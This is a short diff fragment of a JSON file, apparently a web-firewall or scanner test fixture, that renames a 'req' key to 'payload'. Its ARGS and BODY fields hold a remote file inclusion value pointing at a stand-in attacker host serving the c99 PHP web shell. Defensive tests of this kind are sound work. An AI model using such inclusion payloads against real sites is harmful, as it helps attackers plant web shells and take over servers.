@@ -1,5 +1,5 @@
 {
-  "req": [
+  "payload": [
     {
       "ARGS": "url=http://evil.example.com/c99.php",
       "BODY": "url=http://evil.example.com/c99.php",
